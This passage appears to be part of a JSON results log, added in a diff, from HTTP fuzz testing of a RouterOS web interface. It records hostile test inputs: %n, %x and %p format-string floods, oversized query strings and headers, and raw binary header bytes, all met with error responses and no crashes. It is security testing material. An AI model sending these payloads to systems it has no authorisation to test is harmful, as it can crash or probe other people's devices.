+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 1000\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%... [truncated, total 1127 chars]",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:02 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m44s",
+        "uptime_after": "2h6m45s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 128,
+      "category": "edge_cases",
+      "name": "Format string in POST body: 500x %n (write)",
+      "description": "Send format string specifiers in POST body",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:08.002104",
+      "details": {
+        "payload_size": 1127,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 1000\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%... [truncated, total 1127 chars]",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:03 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m45s",
+        "uptime_after": "2h6m45s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 129,
+      "category": "edge_cases",
+      "name": "Format string in POST body: 500x %x (hex dump)",
+      "description": "Send format string specifiers in POST body",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:08.830518",
+      "details": {
+        "payload_size": 1127,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 1000\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%... [truncated, total 1127 chars]",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:04 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m46s",
+        "uptime_after": "2h6m46s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 130,
+      "category": "edge_cases",
+      "name": "Format string in POST body: 500x %p (pointer)",
+      "description": "Send format string specifiers in POST body",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:09.642924",
+      "details": {
+        "payload_size": 1127,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 1000\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%... [truncated, total 1127 chars]",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:04 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m47s",
+        "uptime_after": "2h6m47s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 131,
+      "category": "edge_cases",
+      "name": "Oversized query string (1024B)",
+      "description": "Send GET with 1024-byte query string",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:10.455330",
+      "details": {
+        "payload_size": 1080,
+        "payload_preview": "GET /?a=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB... [truncated, total 1080 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:05 GMT\r\nExpires: Tue, 16 Feb 2027 21:46:05 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h6m48s",
+        "uptime_after": "2h6m48s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 132,
+      "category": "edge_cases",
+      "name": "Oversized query string (4096B)",
+      "description": "Send GET with 4096-byte query string",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:11.267736",
+      "details": {
+        "payload_size": 4152,
+        "payload_preview": "GET /?a=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB... [truncated, total 4152 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:06 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m48s",
+        "uptime_after": "2h6m49s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 133,
+      "category": "edge_cases",
+      "name": "Oversized query string (16384B)",
+      "description": "Send GET with 16384-byte query string",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:12.092148",
+      "details": {
+        "payload_size": 16440,
+        "payload_preview": "GET /?a=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB... [truncated, total 16440 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:07 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m49s",
+        "uptime_after": "2h6m50s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 134,
+      "category": "edge_cases",
+      "name": "Oversized query string (65536B)",
+      "description": "Send GET with 65536-byte query string",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:12.908556",
+      "details": {
+        "payload_size": 65592,
+        "payload_preview": "GET /?a=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB... [truncated, total 65592 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:08 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m50s",
+        "uptime_after": "2h6m50s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 135,
+      "category": "edge_cases",
+      "name": "Single header 128KB",
+      "description": "Send single header with 131072-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:13.724964",
+      "details": {
+        "payload_size": 131137,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Huge: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 131137 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:09 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:09 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h6m51s",
+        "uptime_after": "2h6m51s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 136,
+      "category": "edge_cases",
+      "name": "Pipelined requests (2 in 1 send)",
+      "description": "Send two complete HTTP requests in one TCP segment",
+      "result": "Response: HTTP/1.1 200 OK (1509 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:19.539870",
+      "details": {
+        "payload_size": 135,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: keep-alive\r\n\r\nGET /rest/system/resource HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: Keep-Alive\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:09 GMT\r\nExpires: Tue, 16 Feb 2027 21:46:09 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae6... [truncated, total 1508 chars]",
+        "error": null,
+        "uptime_before": "2h6m52s",
+        "uptime_after": "2h6m57s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 137,
+      "category": "edge_cases",
+      "name": "Unusual HTTP method: OPTIONS",
+      "description": "Send OPTIONS request to test method handling",
+      "result": "Response: HTTP/1.0 503 Service Unavailable (331 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:20.364282",
+      "details": {
+        "payload_size": 59,
+        "payload_preview": "OPTIONS / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:15 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m57s",
+        "uptime_after": "2h6m58s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 138,
+      "category": "edge_cases",
+      "name": "Unusual HTTP method: TRACE",
+      "description": "Send TRACE request to test method handling",
+      "result": "Response: HTTP/1.0 503 Service Unavailable (331 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:21.176688",
+      "details": {
+        "payload_size": 57,
+        "payload_preview": "TRACE / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:16 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m58s",
+        "uptime_after": "2h6m59s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 139,
+      "category": "edge_cases",
+      "name": "Unusual HTTP method: CONNECT",
+      "description": "Send CONNECT request to test method handling",
+      "result": "Response: HTTP/1.0 503 Service Unavailable (331 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:22.001100",
+      "details": {
+        "payload_size": 59,
+        "payload_preview": "CONNECT / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:17 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "error": null,
+        "uptime_before": "2h6m59s",
+        "uptime_after": "2h6m59s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 140,
+      "category": "edge_cases",
+      "name": "Unusual HTTP method: PROPFIND",
+      "description": "Send PROPFIND request to test method handling",
+      "result": "Response: HTTP/1.0 503 Service Unavailable (331 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:22.813506",
+      "details": {
+        "payload_size": 60,
+        "payload_preview": "PROPFIND / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:18 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m",
+        "uptime_after": "2h7m",
+        "crashed": false
+      }
+    },
+    {
+      "id": 141,
+      "category": "edge_cases",
+      "name": "Unusual HTTP method: MKCOL",
+      "description": "Send MKCOL request to test method handling",
+      "result": "Response: HTTP/1.0 503 Service Unavailable (331 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:23.629914",
+      "details": {
+        "payload_size": 57,
+        "payload_preview": "MKCOL / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:18 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m1s",
+        "uptime_after": "2h7m1s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 142,
+      "category": "edge_cases",
+      "name": "Unusual HTTP method: MOVE",
+      "description": "Send MOVE request to test method handling",
+      "result": "Response: HTTP/1.0 503 Service Unavailable (331 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:24.470334",
+      "details": {
+        "payload_size": 56,
+        "payload_preview": "MOVE / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:19 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m2s",
+        "uptime_after": "2h7m2s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 143,
+      "category": "edge_cases",
+      "name": "Unusual HTTP method: LOCK",
+      "description": "Send LOCK request to test method handling",
+      "result": "Response: HTTP/1.0 503 Service Unavailable (331 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:25.274736",
+      "details": {
+        "payload_size": 56,
+        "payload_preview": "LOCK / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:20 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m2s",
+        "uptime_after": "2h7m3s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 144,
+      "category": "edge_cases",
+      "name": "Unusual HTTP method: UNLOCK",
+      "description": "Send UNLOCK request to test method handling",
+      "result": "Response: HTTP/1.0 503 Service Unavailable (331 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:26.091144",
+      "details": {
+        "payload_size": 58,
+        "payload_preview": "UNLOCK / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:21 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m3s",
+        "uptime_after": "2h7m4s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 145,
+      "category": "edge_cases",
+      "name": "Binary data in header value (256 bytes)",
+      "description": "Send header value containing all 256 byte values",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:31.910052",
+      "details": {
+        "payload_size": 323,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Binary: \u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\b\t\n\u000b\f\r\u000e\u000f\u0010\u0011\u0012\u0013\u0014\u0015\u0016\u0017\u0018\u0019\u001a\u001b\u001c\u001d\u001e\u001f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\u007f\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd... [truncated, total 323 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:22 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m4s",
+        "uptime_after": "2h7m9s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 146,
+      "category": "edge_cases",
+      "name": "High-bit chars in header value",
+      "description": "Send header value with bytes 0x80-0xFF",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:32.734464",
+      "details": {
+        "payload_size": 4164,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-HighBit: \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd... [truncated, total 4164 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:28 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:28 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h7m10s",
+        "uptime_after": "2h7m10s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 147,
+      "category": "edge_cases",
+      "name": "64KB request line (method + path)",
+      "description": "Send request line that exceeds 64KB in total",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:33.542868",
+      "details": {
+        "payload_size": 65585,
